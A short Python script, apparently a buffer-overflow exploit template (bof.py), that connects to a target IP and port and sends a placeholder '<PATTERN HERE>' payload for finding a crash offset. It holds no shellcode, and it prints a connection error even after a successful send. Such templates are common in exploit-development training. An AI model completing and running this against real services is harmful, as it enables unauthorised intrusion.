#!/usr/bin/python
# Python Script (bof.py)

import socket
import sys

ip = sys.argv[1]
port = int(sys.argv[2])

payload = b"<PATTERN HERE>"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.recv(1024)
s.send(payload)
# print(s.recv(1024))
print("[!] Error connecting to server!")
